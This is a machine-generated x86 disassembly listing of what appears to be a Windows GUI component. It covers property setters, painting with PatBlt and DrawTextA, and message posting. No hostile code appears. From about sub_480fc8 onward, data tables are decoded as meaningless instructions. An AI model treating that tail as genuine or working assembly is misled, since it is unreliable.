call [ edx + 0x7c ]
mov eax esi
call sub_47ff34
sub_47ff34
add esp 0xfffffff0
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
add esp 0x10
retn
mov [ esp ] 0xb402
xor ecx ecx
mov [ esp + 0x4 ] ecx
mov [ esp + 0x8 ] eax
xor ecx ecx
mov [ esp + 0xc ] ecx
mov ecx esp
mov eax edx
mov edx ecx
call sub_44c528
sub_47ff64
push esi
mov esi eax
cmp esi [ edx + 0x8 ]
sete al
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd8 ]
cmp [ esi + 0x18a ] 0x0
je r-xdata
pop esi
retn
mov eax esi
call sub_48060c
cmp [ eax + 0x224 ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ esi + 0x16c ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
sub_47ffb0
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
mov eax [ esp ]
cmp eax [ esi + 0x17a ]
jne r-xdata
push esi
lea edi [ esi + 0x17a ]
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
mov edx [ eax ]
call [ edx + 0xdc ]
mov eax [ esp + 0x4 ]
cmp eax [ esi + 0x186 ]
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esi + 0x182 ]
jne r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esi + 0x186 ]
je r-xdata
add esp 0x10
pop edi
pop esi
retn
sub_480010
push esi
mov esi eax
cmp edx [ esi + 0x18c ]
je r-xdata
pop esi
retn
mov [ esi + 0x18c ] edx
mov eax esi
call sub_48060c
test eax eax
je r-xdata
mov eax esi
call sub_48060c
call sub_44b61c
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xdc ]
sub_480048
push ebx
push esi
push edi
add esp 0xffffffe8
mov ebx edx
mov edi eax
cmp bl [ edi + 0x171 ]
je r-xdata
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4c ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ edi + 0x48 ]
xor edx edx
xor eax eax
call sub_4170c4
xor eax eax
mov [ esp ] eax
xor eax eax
mov [ esp + 0x4 ] eax
mov [ edi + 0x171 ] bl
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
mov eax edi
mov si 0xffd0
call sub_403324
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4800a4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_480118
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push ebx
push 0x0
push 0xb404
mov eax esi
call sub_44f7d8
push eax
call PostMessageA
sub_4800d8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax [ esi + 0x38 ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_480118
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_48060c
test eax eax
je r-xdata
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
mov eax ebx
call sub_48060c
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax esi
call sub_479bb4
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x16c ] 0x0
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_47b320
sub_480178
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44979c
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x94 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4801ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
push edi
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_449760
cmp [ ebx + 0x16c ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_48060c
cmp [ eax + 0x224 ] 0x0
je r-xdata
mov [ edi ] al
cmp [ edi ] 0x0
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov al 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
mov al [ ebp + 0xc ]
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov esi eax
cmp [ esi + 0x40 ] 0x0
setne al
xor al 0x1
mov [ edi ] al
cmp [ edi ] 0x0
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
xor esi esi
mov eax ebx
call sub_48060c
mov al [ eax + 0x227 ]
sub al 0x1
jb r-xdata
sub al 0x2
jne r-xdata
mov eax [ esi + 0x40 ]
cmp eax [ ebx + 0x16c ]
je r-xdata
mov eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
je r-xdata
mov edx [ esi + 0x40 ]
mov eax [ ebx + 0x16c ]
call sub_479d58
xor al 0x1
mov [ edi ] al
cmp eax [ ebp - 0x4 ]
jge r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
call sub_48060c
mov edx [ ebx + 0x16c ]
call sub_47d214
mov esi eax
jmp r-xdata
cmp eax [ ebp - 0x4 ]
jle r-xdata
adc eax 0x0
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ esi + 0x40 ]
mov dl 0x1
call sub_480b54
mov esi [ ebx + 0x16c ]
mov eax ebx
call sub_48060c
mov edx [ ebx + 0x16c ]
call sub_47dbd4
mov esi eax
jmp r-xdata
cmp eax [ ebp + 0x10 ]
jge r-xdata
adc eax 0x0
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax ebx
call sub_48060c
mov edx [ ebx + 0x16c ]
call sub_47d214
mov esi eax
jmp r-xdata
cmp eax [ ebp + 0x10 ]
jle r-xdata
adc eax 0x0
mov eax ebx
call sub_48060c
mov edx [ ebx + 0x16c ]
call sub_47dbd4
mov esi eax
sub_480364
push ebx
mov ebx eax
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424b54
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x70 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
mov eax ebx
call sub_48060c
mov al [ eax + 0x227 ]
sub al 0x2
jb r-xdata
push 0x5a0049
push 0x2
push 0x6
push 0x0
push 0x0
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call PatBlt
push 0x5a0049
mov eax ebx
call sub_4489f4
sub eax 0x4
push eax
push 0x2
push 0x2
push 0x2
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call PatBlt
push 0x5a0049
mov eax ebx
call sub_4489f4
push eax
push 0x6
mov eax ebx
call sub_4489f4
sub eax 0x2
push eax
push 0x0
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call PatBlt
pop ebx
retn
sub al 0x2
jb r-xdata
push 0x5a0049
push 0x6
push 0x2
push 0x0
push 0x0
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call PatBlt
push 0x5a0049
push 0x2
mov eax ebx
call sub_4489b0
sub eax 0x6
push eax
push 0x2
push 0x2
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call PatBlt
push 0x5a0049
push 0x6
push 0x2
push 0x0
mov eax ebx
call sub_4489b0
sub eax 0x4
push eax
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call PatBlt
jmp r-xdata
pop ebx
retn
sub_480490
push ebx
push esi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi ] eax
mov eax [ esi ]
mov edx [ ebx + 0x16c ]
mov [ eax + 0x40 ] edx
mov eax [ ebx + 0x16c ]
call sub_47b09c
call sub_479044
mov edx [ esi ]
mov [ edx + 0x38 ] eax
mov edx esi
mov eax ebx
call sub_4497c8
pop esi
pop ebx
retn
sub_4804d0
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x16c ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x16c ]
call sub_47b214
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x16c ]
cmp [ eax + 0x61 ] 0x0
jne r-xdata
mov al 0x1
sub_480538
push ebx
push esi
push edi
mov esi eax
mov bl 0x1
mov edi [ esi + 0x16c ]
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_47b09c
mov al [ eax + 0x28 ]
sub al 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax [ esi + 0x16c ]
mov bl [ eax + 0x51 ]
jmp r-xdata
dec al
je r-xdata
mov bl 0x1
jmp r-xdata
sub_480578
xor edx edx
cmp [ eax + 0x16c ] 0x0
je r-xdata
mov eax edx
retn
mov edx [ eax + 0x16c ]
cmp [ edx + 0x52 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ edx + 0x48 ] 0x0
jne r-xdata
mov edx eax
mov al 0x1
sub_4805a4
push ebx
push esi
push edi
mov edi eax
xor ebx ebx
mov esi [ edi + 0x16c ]
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_47b0a8
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ edi + 0x16c ]
call sub_47b0a8
mov bl [ eax + 0x69 ]
sub_480620
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_48060c
test eax eax
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xdc ]
sub_480644
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_480714
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_4170c4
lea esi [ ebp - 0x10 ]
lea edi [ ebx + 0x190 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebx + 0x16c ] 0x0
je r-xdata
push 0x400
lea eax [ ebx + 0x190 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_448fac
mov eax [ ebp - 0x18 ]
call sub_404378
push eax
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call DrawTextA
push 0x400
lea eax [ ebx + 0x190 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x16c ]
call sub_47b0b8
mov eax [ ebp - 0x14 ]
call sub_404378
push eax
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call DrawTextA
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48071b
lea eax [ ebp - 0x18 ]
call sub_403eb8
lea eax [ ebp - 0x14 ]
call sub_403eb8
retn
sub_480724
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x16c ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xbc ]
mov eax [ esi + 0x160 ]
mov eax [ eax + 0xc ]
mov edx [ esi + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
call sub_480644
mov ebx [ esi + 0x48 ]
mov edi [ esi + 0x4c ]
mov al [ esi + 0x171 ]
sub al 0x2
jb r-xdata
mov edx esp
mov eax esi
call sub_47ecf4
mov ebx eax
mov eax [ esi + 0x17a ]
add eax [ esp ]
add ebx eax
mov eax esi
call sub_47ec64
add ebx eax
add ebx [ esi + 0x182 ]
mov eax esi
call sub_47ecac
mov edx eax
mov eax [ esp + 0x4 ]
call sub_42ba68
mov edi eax
add edi [ esi + 0x17e ]
add edi [ esi + 0x186 ]
jmp r-xdata
sub al 0x2
jb r-xdata
cmp ebx [ esi + 0x48 ]
jne r-xdata
mov eax esi
call sub_47ec64
mov ebx eax
mov eax [ esi + 0x17a ]
add eax [ esp ]
add ebx eax
add ebx [ esi + 0x182 ]
mov edx esp
mov eax esi
call sub_47ecf4
mov edi eax
mov eax [ esi + 0x17e ]
add eax [ esp + 0x4 ]
add edi eax
mov eax esi
call sub_47ecac
add edi eax
add edi [ esi + 0x186 ]
jmp r-xdata
push ebx
push edi
mov ecx [ esi + 0x44 ]
mov edx [ esi + 0x40 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax esi
mov si 0xffd0
call sub_403324
cmp edi [ esi + 0x4c ]
je r-xdata
sub_480834
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x16c ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
call sub_47b09c
call sub_419538
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_44c070
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_47d41c
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_480993
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4032d8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_47baa4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_477b70
mov [ ebp - 0x1c ] 0xb411
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44c528
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax edi
mov edx [ r-xdata ]
call sub_4032d8
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47b09c
mov edx [ ebx + 0x40 ]
cmp eax [ edx + 0x4 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_47d41c
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_44c078
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47b09c
mov edx ebx
call sub_47a4d4
mov eax [ eax + 0x40 ]
cmp [ eax + 0x170 ] 0x0
je r-xdata
mov eax [ ebx + 0x40 ]
call sub_4191a8
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_4191a8
cmp esi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47b09c
mov edx eax
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ ebx + 0x40 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_48060c
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x6c ]
mov edx [ eax + 0x28 ]
mov eax [ ebx + 0x40 ]
call sub_47b5fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_47d41c
mov edx [ ebp - 0x8 ]
call sub_419738
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_48060c
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x6c ]
mov edx [ eax + 0x28 ]
mov eax edi
call sub_47b5fc
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_47ba70
mov edx eax
mov eax edi
call sub_47b3d0
mov edx [ ebp - 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x14 ]
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47b09c
mov edx ebx
call sub_47a4d4
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
mov eax [ ebx + 0x40 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_48060c
cmp [ eax + 0x224 ] 0x0
je r-xdata
dec [ ebp - 0x8 ]
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebx + 0x40 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
sub_480aa0
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x18b ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x18b ] dl
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov eax ebx
mov si 0xffd0
call sub_403324
sub_480acc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_44b35c
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_479b80
call sub_419538
test eax eax
jle r-xdata
mov eax ebx
call sub_48060c
call sub_47ea88
mov ecx [ ebx + 0x4 ]
mov dl 0x1
call [ eax + 0x2c ]
mov edx [ r-xdata ]
call sub_4032d8
mov esi eax
mov [ esi + 0x270 ] 0x1
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx [ ebx + 0x16c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x124 ]
movsx ecx [ edi + 0xa ]
movsx edx [ edi + 0x8 ]
mov eax esi
call sub_472860
mov eax esi
call sub_403128
sub_480b54
push esi
add esp 0xfffffff0
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
add esp 0x10
pop esi
retn
mov [ esi + 0x170 ] dl
test dl dl
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0xb411
xor eax eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] esi
xor eax eax
mov [ esp + 0xc ] eax
mov edx esp
mov eax [ esi + 0x30 ]
call sub_44c528
sub_480bb8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx edx
xor eax eax
push ebp
push sub_480c27
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_4032d8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480c2e
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
sub_480c34
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_480c79
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480c80
retn
mov eax rw-data
call sub_403eb8
mov eax rw-data
call sub_4057b4
mov eax rw-data
call sub_403eb8
sub_480c84
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_480cc3
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480cca
retn
xor eax eax
mov [ rw-data ] eax
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417d80
sub_480fc8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4811 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x11
dec eax
add [ eax + 0x1c004811 ] dh
add eax [ eax ]
add [ eax - 0x15 ] dl
inc esi
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + ebp + 0x48 ] ch
add al dh
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 + 0x20d80041 ] dl
inc edi
add [ ebx + esi ] al
inc edi
add ah cl
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax + ebp ] ch
dec eax
add [ esi + edi * 8 ] al
inc esp
add [ edx + esi ] ah
inc edi
add [ edx + eax + 0x45 ] ch
add al cl
add [ eax + eax - 0x80 ] 0xf8
inc esp
add ah bh
xor [ edi ] eax
mov eax 0x100044f5
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ ebp - 0x7283ffba ] bh
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add al ah
push ss
inc edi
add [ ecx + edx * 4 - 0x23fbffbc ] dl
inc edi
add [ eax ] bl
sbb [ edi ] al
and [ ebx - 0x9f3ffbc ] dh
inc esp
add al cl
test [ eax + eax - 0x68 ] 0xe1
inc edi
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al ch
mov edi 0xcc780047
inc esp
add [ eax + 0x26 ] ch
inc edi
add [ eax - 0x37 ] ah
inc esp
add [ eax - 0x43ffbb39 ] dl
retn
sub_4810be
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x70 ] 0xc00047d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax + 0x4c ] 0x14004829
rol [ edi ] 0xf8
rol [ edi ] 0xd4
and eax 0x26380047
inc edi
add [ eax ] ah
int 0x47
add [ edx + ebx * 8 - 0x261bffb9 ] dl
inc edi
add [ eax ] dh
inc edi
add ah dl
into
inc edi
add [ edx + edx * 8 + 0x47 ] cl
add al bl
rol [ edi ] cl
mov bl dl
inc edi
add [ eax - 0x24 ] cl
inc edi
add al bh
fadd [ edi ]
hlt
sub_4814e4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x16
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx ] bl
dec eax
add [ eax - 0x43ffffff ] bh
0x46
sub_481668
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
sbb [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
sbb [ eax ] cl
sub [ ebx ] al
add [ eax ] al
lodsb [ esi ]
in eax dx
inc esi
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0xfffb8cc ] ah
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 + 0x20d80041 ] dl
inc edi
add [ ebx + esi ] al
inc edi
add ah cl
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add al dl
xor eax 0xfe040048
inc esp
add al dl
xor al 0x47
add [ edx + eax + 0x45 ] ch
add al cl
add [ eax + eax - 0x80 ] 0xf8
inc esp
add ah bh
xor [ edi ] eax
mov eax 0x100044f5
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ ebp - 0x7283ffba ] bh
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add al ah
push ss
inc edi
add [ ecx + edx * 4 - 0x23fbffbc ] dl
inc edi
add [ eax ] bl
sbb [ edi ] al
and [ ebx - 0x9f3ffbc ] dh
inc esp
add al cl
test [ eax + eax - 0x68 ] 0xe1
inc edi
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al ch
mov edi 0xcc780047
inc esp
add [ eax + 0x26 ] ch
inc edi
add [ eax - 0x37 ] ah
inc esp
add [ eax - 0x43ffbb39 ] dl
retn
sub_48175e
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x70 ] 0xc00047d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax + 0x20 ] 0x14004836
rol [ edi ] 0x4
xor eax 0x25d40047
inc edi
add [ eax ] bh
inc edi
add [ eax ] ah
int 0x47
add [ edx + ebx * 8 - 0x261bffb9 ] dl
inc edi
add [ eax ] dh
inc edi
add ah dl
into
inc edi
add [ edx + edx * 8 + 0x47 ] cl
add al bl
rol [ edi ] cl
mov bl dl
inc edi
add [ eax - 0x24 ] cl
inc edi
add al bh
fadd [ edi ]
hlt
sub_4818a0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
[ eax ] ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x19
dec eax
add al dl
add [ eax ] eax
add [ ecx + ecx * 8 ] bh
inc esi
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add al bh
mov [ 0x30c00044 ] eax
inc eax
add ah bl
xor [ eax ] al
add cl bl
inc esi
add al bl
mov al 0x44
add al dl
movsb [ edi ] [ esi ]
inc esp
add [ ecx * 4 - 0x2c6fffbf ] dl
inc esi
add [ esp + eax * 4 + 0x44 ] dl
add al al
add [ eax + eax - 0x6c ] 0xffffff8d
inc esp
add ah dl
adc al 0x42
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax + 0x680046db ] ah
lahf
inc esp
add [ edi + ebx * 4 + 0x44 ] ah
add [ eax ] dh
inc esp
add al ah
add eax 0x8a340048
inc esp
add [ eax - 0x3fffbb77 ] bl
xchg edx eax
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add [ edx + 0x44 ] ah
add al bh
add eax 0x94800048
inc esp
add [ edx * 4 - 0x2897ffbc ] ch
inc esi
add [ edx * 4 - 0x2493ffbc ] cl
inc esi
add [ ebp * 8 + 0x8340047 ] ah
dec eax
add [ eax ] bh
add eax 0xd38c0048
inc esi
add [ ecx + eax ] cl
dec eax
add al dl
int1
inc edi
add [ eax + ebx * 8 ] cl
inc esi
add [ ecx + eax * 2 ] bl
dec eax
add al cl
test [ edi ] sub_47f838
pushfd
cmc
inc edi
add [ eax ] bh
std
inc edi
add [ ebp + eax - 0x6efffb8 ] ah
inc edi
add [ eax - 0x30fffb8 ] ah
inc edi
add [ eax - 0x2a ] ah
inc esi
add ah dh
xlat
inc esi
add [ eax ] ah
xlat
inc esi
add ah ah
rol [ esi ] 0x1
movsb [ edi ] [ esi ]
add [ eax ] cl
mov bl dl
inc esi
add al ch
fild [ esi ]
adc eax 0x53505854
je r-xdata
cld
or eax 0x33840042
insb
push esp
outsd
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
je r-xdata
retn
insb
inc ecx
push edx
insd
outsd
jbe r-xdata
inc eax
add al bh
mov [ 0x30c00044 ] eax
inc eax
add ah bl
xor [ eax ] al
